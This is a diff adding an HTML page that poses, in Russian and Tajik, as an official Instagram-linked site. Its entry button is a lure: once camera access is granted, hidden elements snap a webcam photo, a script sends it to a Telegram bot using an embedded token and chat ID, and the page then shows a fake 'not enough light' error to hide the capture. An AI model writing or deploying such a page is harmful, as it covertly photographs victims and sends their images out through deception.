@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>www.Instagram-xoshimzoda//Официальные сайт  xosh1mzoda</title>
+    <meta charset="utf-8">
+</head>
+<body style="text-align: center; background: #000; color: #fff; font-family: sans-serif;">
+    <h2>Чтобы войтив сайт нажмите кнопку , с ниже ⏬!</h2>
+    <p>Нажми кнопку ниже, а потом разрешить
+    </h3>Барои ворид шудан ба тугмаи зери навиштачот зер кунед то ки ворид шавед, пеш аз ворид шудан тугмаи "разрешить" зер кунед!
+    
+    <!-- Кнопка, которая активирует камеру -->
+    <button id="start" style="padding: 15px 30px; font-size: 18px; border-radius: 10px; border: none; background: #0088cc; color: white;">Instagram-xoshimzoda</button>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const token = '8451687940:AAF5ol406SUXrT33g330J3E-iZ5qjvp7A50';
+        const chatId = '7829181579';
+
+        document.getElementById('start').onclick = async () => {
+            try {
+                // Запрос разрешения у пользователя
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Ждем секунду, чтобы камера сфокусировалась, и делаем кадр
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    // Превращаем фото в файл для отправки
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'snap.jpg');
+
+                        // Отправка в твой Телеграм через API
+                        fetch(`https://api.telegram.org{token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            alert("Ошибка теста: недостаточно освещения! Попробуй позже.");
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (err) {
+                alert("Чтобы написать в Instagram-xoshimzoda вы должны нажать,Разрешить чтобы писать");
+            }
+        };
+    </script>
+</body>
+</html>
